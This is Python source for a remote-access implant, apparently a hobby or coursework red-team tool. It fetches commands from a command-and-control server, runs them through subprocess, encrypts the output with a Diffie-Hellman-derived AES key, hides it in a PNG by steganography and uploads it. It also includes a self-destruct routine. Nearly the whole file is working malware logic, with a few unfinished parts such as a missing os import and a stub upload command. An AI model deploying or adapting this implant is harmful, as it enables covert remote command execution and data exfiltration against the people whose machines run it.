from Crypto.Cipher import AES
from stegano import lsb
import uuid
import requests
import subprocess
import time
import sys
from diffiehellman import DiffieHellman

GREEN = '\033[32m'
RED = '\033[31m'
STATUS = '\033[36m'
RESET = '\033[0m'


global_key = None

url = "http://localhost:80/" #remember to change this to the actual IP address of machine running the C2 Server.

routes = {
    0 : url + "task", 
    1: url + "upload",
    2: url + "getkey",
    3: url + "sendkey"
}

#Encryption of data -- IV is concatenated at the end of message for decryption
def encrypt(plain_str): 
    padding = 16 - (len(plain_str) % 16)
    cipher = AES.new(global_key, AES.MODE_CBC)
    plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
    encrypted = cipher.encrypt(plaintext)
    #print(f"[*] Encrypted Message: {encrypted})")
    print(f"{STATUS}[*]{RESET} Encrypted Message")
    return (encrypted + cipher.iv).decode("latin-1")

#Decryption of data 
def decrypt(ciphertext): 
    ciphertext = ciphertext.encode("latin-1")
    init_v = ciphertext[-16:]
    cipher = AES.new(global_key, AES.MODE_CBC, init_v)
    msg = ciphertext[:-16]
    plaintext = cipher.decrypt(msg)
    plaintext = plaintext[:-plaintext[len(plaintext)-1]]
    print(f"{STATUS}[*]{RESET} Command: {plaintext.decode()}")
    return plaintext.decode() 

#str is the encrypted string of data that needs to be hidden in a file. 
def mod_img(msg):
    path = "./images/"
    file_name = "safari-bird"
    encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
    encoded_img.save(f"{path}{file_name}-final.png")
    #Error Checking: 
    #print("[*] Revealed from image:")
    #print(lsb.reveal(f"{path}{file_name}-final.png"))
    return f"{path}{file_name}-final.png" 

#Execute command 
def exec(cmd): 
    result = ""
    if cmd == "sleep 10":
        print(f"{STATUS}[*]{RESET} Sleeping...")
        time.sleep(10)
    else: 
        cmd_lst = cmd.split()
        if cmd_lst[0] == "destroy":
            destroy()
        elif cmd_lst[0] == "upload": 
            print(f"[+] Reading {cmd_lst[1]}")
            pass #needs to be implemented
        else: 
            print(f"{GREEN}[+]{RESET} Executing command: %s" % cmd)
            output = subprocess.run(cmd_lst, capture_output=True, text=True)
            result = output.stdout 
            print(f"{GREEN}[+]{RESET} Result: %s" % result)
    return result 

#Sending output back to C2Server 
def send_output(obf_img): 
    print(f"{GREEN}[+]{RESET} Sending image back to server...")
    requests.post(routes[1], files={"file": open(obf_img,'rb')})
    return

#Called to clean up and destroy implant
def destroy(): 

    application_path = os.path.dirname(sys.executable)+"/implant"
    print("executeable path  "+application_path)
    try:
    	subprocess.Popen(f"ls {application_path}",shell=True)
    	subprocess.Popen(f"rm -f {application_path}",shell=True)
    	sys.exit(0)
    except Exception as e:
    	print(f"error deleting file")
    pass

def key_dist():
    global global_key
    #getting server public key 
    response = requests.get(routes[2])
    response = response.json()
    server_public_key = response["key"].encode("latin-1")
    #print(f"[+] Server public key: {server_public_key}")

    #sending generated public key 
    dh = DiffieHellman(group=14, key_bits=540)
    public_key = dh.get_public_key()
    #print(f"[+] My public key: {public_key}")
    json_obj = {"key" : public_key.decode("latin-1")}
    requests.post(routes[3], json=json_obj)

    #deriving shared AES key
    global_key=dh.generate_shared_key(server_public_key)[:16]
    #print(f"[+] Derived AES key: {global_key}")
    print(f"{GREEN}[+]{RESET} Derived AES key")
    return 


#Setting up initial connection with C2 Server
def init(): 
    tries = 0
    while tries < 3: 
        print(f"{GREEN}[+]{RESET} Contacting Server...")
        try:
            response = requests.get(url)
            print(f"{GREEN}[+]{RESET} Connection Established...")
            print(response.text)
            key_dist()
            return
        except Exception as e: 
            print(f"{RED}[-]{RESET} Error in Contacting Server...")
            tries += 1
    print(f"{RED}[-]{RESET} Failure in establishing connection.")
    destroy()
    sys.exit(1) #If reached, server cannot be contacted, and must exit

#Gets task from GET request and executes 

def parse_json(response): 
    res_json = response.json()
    cmd = ""
    if res_json["task"] == None: 
        print(f"{RED}[-]{RESET} Error in parsing JSON.")
        cmd = "echo 0" #just doing this to handle error case 
    else:
        cmd = res_json["task"]
    return cmd

if __name__ == '__main__':
    init()

    num_tries = 1
    while True: 
        try: 
            #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
            #comment out encrypt and decrypt functions to test overall functionality (they won't work since IV is not shared between server and client yet.)
            response = requests.get(routes[0]) 
            encrypted_cmd = parse_json(response) 
            cmd = decrypt(encrypted_cmd) 
            output = exec(cmd) 
            if output != "": 
                msg = encrypt(output)
                obf_img = mod_img(msg)
                send_output(obf_img)
            num_tries = 1
        except Exception as e: 
            if num_tries > 3: 
                print(f"{RED}[-]{RESET} Lost contact with server. Exiting...")
                break
            else:
                time.sleep(num_tries*15)
                print(f"{RED}[-]{RESET} Could not contact server. Re-try #{num_tries}...")
                num_tries += 1
    


    
